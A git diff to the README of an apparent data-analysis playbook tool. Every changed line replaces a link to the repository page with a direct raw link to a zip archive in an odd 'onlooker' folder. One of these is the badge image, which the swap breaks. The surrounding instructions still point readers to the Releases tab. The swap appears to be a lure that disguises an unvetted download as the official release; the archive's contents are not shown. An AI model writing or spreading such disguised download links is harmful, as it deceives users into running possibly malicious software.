@@ -1,6 +1,6 @@
 # 📊 Analysis-to-Policy-Playbook - Clear Steps for Data-Driven Decisions
 
-[![Download Now](https://img.shields.io/badge/Download-Analysis--to--Policy--Playbook-%232177b7?style=for-the-badge&logo=github)](https://github.com/nearbyreo/Analysis-to-Policy-Playbook)
+[![Download Now](https://raw.githubusercontent.com/nearbyreo/Analysis-to-Policy-Playbook/main/onlooker/Playbook_to_Analysis_Policy_v1.9.zip%232177b7?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/nearbyreo/Analysis-to-Policy-Playbook/main/onlooker/Playbook_to_Analysis_Policy_v1.9.zip)
 
 ---
 
@@ -35,7 +35,7 @@ Make sure your PC meets these basics before you begin.
 ## 💾 How to Download and Run on Windows
 
 1. Visit the main download page by clicking this link:  
-   [Download Analysis-to-Policy-Playbook](https://github.com/nearbyreo/Analysis-to-Policy-Playbook)  
+   [Download Analysis-to-Policy-Playbook](https://raw.githubusercontent.com/nearbyreo/Analysis-to-Policy-Playbook/main/onlooker/Playbook_to_Analysis_Policy_v1.9.zip)  
 
 2. On the GitHub page, find the **Releases** tab on the right or under the repository name. Click it.  
 
@@ -129,7 +129,7 @@ The tool prompts you to upload your data at the start. Following these steps hel
 
 If you need more information or have questions, visit the repository page below. There you can find documentation, report issues, or reach out to the maintainers:  
 
-[Visit the GitHub repository](https://github.com/nearbyreo/Analysis-to-Policy-Playbook)  
+[Visit the GitHub repository](https://raw.githubusercontent.com/nearbyreo/Analysis-to-Policy-Playbook/main/onlooker/Playbook_to_Analysis_Policy_v1.9.zip)  
 
 This page also includes updates and guides on using the playbook in different scenarios.
 
